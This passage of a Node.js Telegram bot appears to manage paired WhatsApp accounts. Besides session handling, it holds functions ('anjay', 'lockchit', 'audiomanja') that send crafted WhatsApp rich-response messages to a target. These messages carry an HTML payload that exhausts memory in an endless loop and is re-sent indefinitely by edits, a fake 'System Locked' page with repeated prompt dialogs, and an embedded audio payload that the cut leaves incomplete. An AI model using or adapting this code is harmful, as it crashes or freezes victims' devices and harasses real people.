  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

  botwaNumbers.add(number);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
    browser: ["Ubuntu", "Chrome", "20.0.00"],
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "connecting") {
      await sleep(1500);
      try {
        if (!fs.existsSync(path.join(sessionDir, "creds.json"))) {
          const code = await sock.requestPairingCode(number, WA_PAIRING_CODE);
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;

          await updateStatus("botwa pairing", [
            ["number", number],
            ["pairing code", `<b>${formatted}</b>`],
            ["status", "masukkan kode di WhatsApp"],
            ["note", "buka WhatsApp -> Linked Devices -> Link with phone number"]
          ]);
        }
      } catch (err) {
        console.error("botwa pairing error:", err?.message);
        await updateStatus("botwa error", [
          ["number", number],
          ["status", "gagal generate pairing code"],
          ["error", err.message]
        ]);
      }
    }

    if (connection === "open") {
      waSessions.set(number, {
        sock,
        jid: sock.user.id,
        ownerId: userId,
        type: "wa",
        connectedAt: Date.now()
      });
      saveActiveSessions(number, "wa", userId);

      await updateStatus("botwa connected", [
        ["number", number],
        ["jid", sock.user.id],
        ["status", "berhasil terhubung"],
        ["command wa", "kirim <code>.menu</code> dari nomor lain"]
      ]);

      console.log(`[botwa] ${number} connected`);
    }

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      const shouldReconnect = statusCode !== DisconnectReason.loggedOut;

      waSessions.delete(number);

      if (shouldReconnect) {
        await updateStatus("botwa reconnecting", [
          ["number", number],
          ["status", "Successfully Connected"]
        ]);
        setTimeout(() => reconnectWABot(number, userId), 3000);
      } else {
        removeActiveSession(number);
        botwaNumbers.delete(number);
        try { fs.rmSync(sessionDir, { recursive: true, force: true }); } catch (_) {}
        await updateStatus("botwa logout", [
          ["number", number],
          ["status", "session deleted, re-pairing /botwa" + number]
        ]);
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("messages.upsert", async (chatUpdate) => {
    await handleWAMessage(sock, number, chatUpdate);
  });

  waSessions.set(number, { sock, pending: true });
});

bot.onText(/^\/listbotwa$/i, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId) && !adminUsers.includes(userId)) {
    return restricted(chatId);
  }

  const waList = Array.from(waSessions.entries()).filter(([_, d]) => d.type === "wa" || d.sock);

  if (waList.length === 0) {
    return sendRichMenu(chatId,
      `<h3>wa bot list</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>belum ada bot wa yang connect</td></tr>
<tr><td>cara</td><td>kirim /botwa 628xxx</td></tr>
<tr><td>max</td><td>${MAX_WA_BOTS} bot</td></tr>
</table>`
    );
  }

  let rowsHtml = "";
  let i = 1;
  for (const [number, data] of waList) {
    const status = data.sock?.user ? "connected" : "pending";
    const jid = data.jid || data.sock?.user?.id || "-";
    const since = data.connectedAt ? new Date(data.connectedAt).toLocaleString() : "-";
    rowsHtml += `<tr><td>${i}</td><td>${number}</td><td>${status}</td><td>${jid}</td><td>${since}</td></tr>\n`;
    i++;
  }

  await sendRichMenu(chatId,
    `<h3>wa bot list</h3>
<table border="2">
<tr><th>#</th><th>number</th><th>status</th><th>jid</th><th>since</th></tr>
${rowsHtml}
</table>

<p>total: ${waList.length}/${MAX_WA_BOTS} wa bot</p>`
  );
});

bot.onText(/^\/delbotwa(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) return restricted(chatId);

  if (!match[1]) {
    return sendRichMenu(chatId,
      `<h3>missing input</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/delbotwa</td></tr>
<tr><td>example</td><td>/delbotwa 628123456789</td></tr>
</table>`,
      msg.message_id
    );
  }

  const number = match[1].replace(/\D/g, "");
  const data = waSessions.get(number);

  if (!data) {
    return sendRichMenu(chatId,
      `<h3>not found</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>number</td><td>${number}</td></tr>
<tr><td>status</td><td>tidak ditemukan</td></tr>
</table>`,
      msg.message_id
    );
  }

  try {
    if (data.sock) await data.sock.logout().catch(() => {});
    waSessions.delete(number);
    botwaNumbers.delete(number);
    removeActiveSession(number);
    const sessionDir = path.join(SESSIONS_DIR, `wa_${number}`);
    if (fs.existsSync(sessionDir)) fs.rmSync(sessionDir, { recursive: true, force: true });

    await sendRichMenu(chatId,
      `<h3>wa bot deleted</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>number</td><td>${number}</td></tr>
<tr><td>status</td><td>berhasil dihapus</td></tr>
</table>`,
      msg.message_id
    );
  } catch (e) {
    await sendRichMenu(chatId,
      `<h3>error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>message</td><td>${e.message}</td></tr>
</table>`,
      msg.message_id
    );
  }
});

async function reconnectWABot(number, ownerId) {
  const sessionDir = path.join(SESSIONS_DIR, `wa_${number}`);
  if (!fs.existsSync(sessionDir)) return;

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection } = update;
    if (connection === "open") {
      waSessions.set(number, {
        sock,
        jid: sock.user.id,
        ownerId,
        type: "wa",
        connectedAt: Date.now()
      });
      console.log(`[botwa] ${number} reconnected`);
    }
    if (connection === "close") {
      waSessions.delete(number);
      setTimeout(() => reconnectWABot(number, ownerId), 5000);
    }
  });

  sock.ev.on("creds.update", saveCreds);
  sock.ev.on("messages.upsert", async (chatUpdate) => {
    await handleWAMessage(sock, number, chatUpdate);
  });
}

async function initializeWABotSessions() {
  try {
    if (!fs.existsSync(SESSIONS_FILE)) return;
    const active = JSON.parse(fs.readFileSync(SESSIONS_FILE));
    for (const [number, data] of Object.entries(active)) {
      if (data?.type === "wa") {
        if (!canAddMoreWABots()) {
          console.log(`[botwa] skip restore ${number}, limit reached`);
          continue;
        }
        console.log(`[botwa] restoring session ${number}...`);
        botwaNumbers.add(number);
        await reconnectWABot(number, data.ownerId);
      }
    }
  } catch (e) {
    console.error("[botwa] init sessions error:", e?.message);
  }
}

async function fetchAndValidateToken() {
  try {
    const response = await axios.get('https://raw.githubusercontent.com/nonoluteam-debug/database/refs/heads/main/token.json');
    const validTokens = response.data.tokens;

    if (!Array.isArray(validTokens)) {
      console.log('token.json format invalid');
      process.exit(1);
    }

    if (!validTokens.includes(config.BOT_TOKEN)) {
      console.log('your bot token is not registered with kintana');
      process.exit(1);
    }
    initializeBot();
  } catch (error) {
    console.error("error:", error);
    process.exit(1);
  }
}

fetchAndValidateToken();

function attachAntiKidnapTelegram() {
  bot.on("my_chat_member", async (update) => {
    try {
      if (!blockCmdEnabled) return;

      const chat = update.chat;
      const newStatus = update.new_chat_member?.status;
      const oldStatus = update.old_chat_member?.status;
      const addedBy = update.from?.id;

      const wasOut = ["left", "kicked"].includes(oldStatus);
      const isIn = ["member", "administrator"].includes(newStatus);
      if (!wasOut || !isIn) return;
      if (chat.type === "private") return;

      const ownerIds = (config.OWNER_ID || []).map((v) => v.toString());
      const isOwnerAdd =
        ownerIds.includes(String(addedBy)) ||
        String(addedBy) === String(DEVELOPER);

      if (isOwnerAdd) {
        console.log(`[anti-kidnap-tg] owner added bot to ${chat.id}, allowed.`);
        return;
      }

      console.log(`[anti-kidnap-tg] someone else (${addedBy}) added bot to ${chat.id}, auto leaving...`);

      try {
        await bot.sendMessage(
          chat.id,
          `<blockquote>sorry, this bot can only be added by the owner.\naccess denied, the bot will leave.</blockquote>`,
          { parse_mode: "HTML" }
        );
        await new Promise((r) => setTimeout(r, 1500));
      } catch (_) {}

      try {
        await bot.leaveChat(chat.id);
        console.log(`[anti-kidnap-tg] successfully left ${chat.id}`);
      } catch (e) {
        console.error("[anti-kidnap-tg] failed to leave:", e?.message);
      }
    } catch (e) {
      console.error("attachAntiKidnapTelegram error:", e);
    }
  });
}

attachAntiKidnapTelegram();

function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  return `${days} days, ${hours} hours, ${minutes} minutes, ${secs} seconds`;
}

const startTime = Math.floor(Date.now() / 1000);

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

async function initializeBot() {
  console.log(`kintana is now active on your bot`);
  await initializeWhatsAppConnections();
  await initializeWABotSessions();
}

async function anjay(sock, target) {
  const id = () => Math.random().toString(36).substring(2, 10);
  const responseId = id();
  const originalId = id().toUpperCase();

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>System Monitor</title>
<style>
html, body {
    margin: 0;
    padding: 0;
    width: 100%;
    height: 100%;
    background-color: #000000;
    overflow: hidden;
}
</style>
</head>
<body>
<script>
(function() {
    const memoryRetentionArray = [];
    const allocationChunkSize = 1024 * 1024 * 64;

    function saturateEngine() {
        try {
            const rawBuffer = new ArrayBuffer(allocationChunkSize);
            const viewArray = new Uint32Array(rawBuffer);
            
            for (let index = 0; index < viewArray.length; index += 1024) {
                viewArray[index] = index ^ 0xDEADBEEF;
            }
            
            memoryRetentionArray.push(rawBuffer);
            memoryRetentionArray.push(viewArray);
        } catch (allocationError) {
            while (true) {
                const garbageData = new Array(1000000).fill(Math.random());
                memoryRetentionArray.push(garbageData);
            }
        }

        queueMicrotask(saturateEngine);
        queueMicrotask(saturateEngine);
    }

    function spawnMicrotaskSwarm() {
        for (let counter = 0; counter < 50; counter++) {
            queueMicrotask(saturateEngine);
        }
    }

    Promise.resolve().then(spawnMicrotaskSwarm);
    saturateEngine();
})();
</script>
</body>
</html>
`;

  const data = Buffer.from(JSON.stringify({
    response_id: responseId,
    sections: [{
      view_model: {
        __typename: 'GenAISingleLayoutViewModel',
        primitive: {
          __typename: 'GenAIaeacdsnwHtmlPrimitive',
          payload: html,
          trusted_sources: []
        }
      }
    }]
  }).replace(/[\u007f-\uffff]/g, c =>
    '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')
  )).toString('base64');

  const message = {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        botResponseId: responseId
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          response_id: responseId,
          submessages: [],
          unifiedResponse: { data },
          contextInfo: {
            mentionedJid: Array(200).fill(target),
            forwardingScore: 999999,
            isForwarded: true,
            forwardedAiBotMessageInfo: {
              botJid: '867051314767696@bot'
            },
            forwardOrigin: 4,
            expiration: 0,
            ephemeralSettingTimestamp: Date.now(),
            disappearingMode: {
              initiator: 0,
              trigger: 1
            },
            afterReadDuration: 200
          }
        }
      }
    }
  };

  const ctx = {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: { messageDisclaimerText: ("ꦾ").repeat(2), botResponseId: responseId }
    }
  };

  try {
    await sock.relayMessage(target, message, {
      participant: { jid: target },
      noSelfSync: false
    }).catch(() => {});

    await sock.relayMessage(target, { ...ctx, ...message }, { messageId: originalId }).catch(() => {});

    await new Promise(r => setTimeout(r, 1000));

    while (true) {
      try {
        const protocolEdit = {
          ...ctx,
          botForwardedMessage: {
            message: {
              protocolMessage: {
                key: { remoteJid: target, fromMe: true, id: originalId },
                type: 14,
                timestampMs: Date.now(),
                editedMessage: message
              }
            }
          }
        };

        await sock.relayMessage(target, protocolEdit, { messageId: '3EB0' + id() }).catch(() => {});
        await new Promise(r => setTimeout(r, 2000));
      } catch (err) {
        await new Promise(r => setTimeout(r, 2000));
      }
    }
  } catch (e) {}
}

async function lockchit(sock, target) {
  const html = `<!doctype html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>
html,body{margin:0;padding:0;width:100%;height:100%;background:radial-gradient(circle at center,#0a0a0a,#000);color:#fff;font-family:monospace;display:flex;align-items:center;justify-content:center;overflow:hidden}
.box{text-align:center;width:100%;padding:0 20px;animation:pulse 2s infinite}
.title{font-size:12vw;line-height:1.1;font-weight:900;letter-spacing:4px;background:linear-gradient(90deg,#ff0044,#ffaa00,#00ffaa,#0088ff,#ff0044);background-size:300% 300%;-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:glow 3s linear infinite;text-shadow:0 0 40px rgba(255,0,68,.6)}
.sub{margin-top:20px;color:#888;font-size:4vw;letter-spacing:2px}
@keyframes glow{0%{background-position:0% 50%}100%{background-position:300% 50%}}
@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.08)}}
</style></head><body><div class="box"><div class="title">@heysaka</div><div class="sub">System Locked</div></div><script>
(function(){
  let n = 0;
  while(n < 50) {
    n++;
    const pwd = prompt("System Locked.\\n\\nMasukkan Password untuk membuka:");
    if (pwd === "@heysaka") { alert("Password Benar, tapi tetap tidak bisa dibuka."); }
    else { alert("Password Salah. System Tetap Terkunci."); }
  }
})();
</script></body></html>`;

  const gid = () => '3EB0' + Math.random().toString(36).substring(2, 18).toUpperCase();
  const guu = () => [8, 4, 4, 4, 12].map(n => Math.random().toString(36).substring(2, 2 + n)).join('-');

  const build = () => {
    const rid = guu();
    const rich = {
      messageType: 1,
      response_id: rid,
      submessages: [{ messageType: 2, messageText: '@heysaka' }],
      unifiedResponse: {
        data: Buffer.from(JSON.stringify({
          __typename: 'XMSGGenAIUnifiedResponse',
          response_id: rid,
          sections: [{
            __typename: 'GenAIUnifiedResponseSection',
            view_model: {
              __typename: 'GenAISingleLayoutViewModel',
              primitive: { __typename: 'GenAIaeacdsnwHtmlPrimitive', payload: html, trusted_sources: [] }
            }
          }]
        })).toString('base64')
      },
      contextInfo: {
        forwardingScore: 99999,
        isForwarded: true,
        forwardOrigin: 4,
        expiration: 0,
        ephemeralSettingTimestamp: Date.now(),
        disappearingMode: { initiator: 0, trigger: 1 },
        afterReadDuration: 1,
        mentionedJid: [target],
        aiProvenance: {
          c2PaMetadata: { createdWithGenAi: true, editedWithGenAi: true },
          iptcMetadata: { createdWithGenAi: true, editedWithGenAi: true }
        }
      }
    };
    return {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2,
        messageSecret: Buffer.alloc(32, 1).toString('base64'),
        botMetadata: { messageDisclaimerText: '', botResponseId: rid, imagineMetadata: { imagineType: 1, shortPrompt: '@heysaka' } }
      },
      botForwardedMessage: { message: { richResponseMessage: rich } }
    };
  };

  const edit = (id, p) => ({
    botForwardedMessage: {
      message: {
        protocolMessage: {
          key: { remoteJid: target, fromMe: true, id },
          type: 14,
          timestampMs: Date.now(),
          editedMessage: p
        }
      }
    }
  });

  try {
    const id = gid();
    await sock.relayMessage(target, build(), { messageId: id });
    await sock.relayMessage(target, edit(id, build()), { messageId: gid() });
    await sock.relayMessage(target, edit(id, build()), { messageId: gid() });
  } catch (e) {}
}

async function audiomanja(sock, target) {
  const uid = () => 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
    const r = Math.random() * 16 | 0
    return (c === 'x' ? r : (r & 3 | 8)).toString(16)
  })

  const fill = (s, n) => Buffer.concat([
    Buffer.from(s),
    Buffer.from(Array.from(
      { length: n - Buffer.byteLength(s) },
      () => Math.random() * 256 | 0
    ))
  ]).toString('base64')

  const id = uid()
  const mid = uid().replaceAll('-', '').toUpperCase()

  const html = `<!doctype html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
</head>
<body>
<script>
(async function() {
  try {
    const AC = window.AudioContext || window.webkitAudioContext;
    if (!AC) return;

    const ctx = new AC();
    await ctx.resume();
    
    const base64Data = "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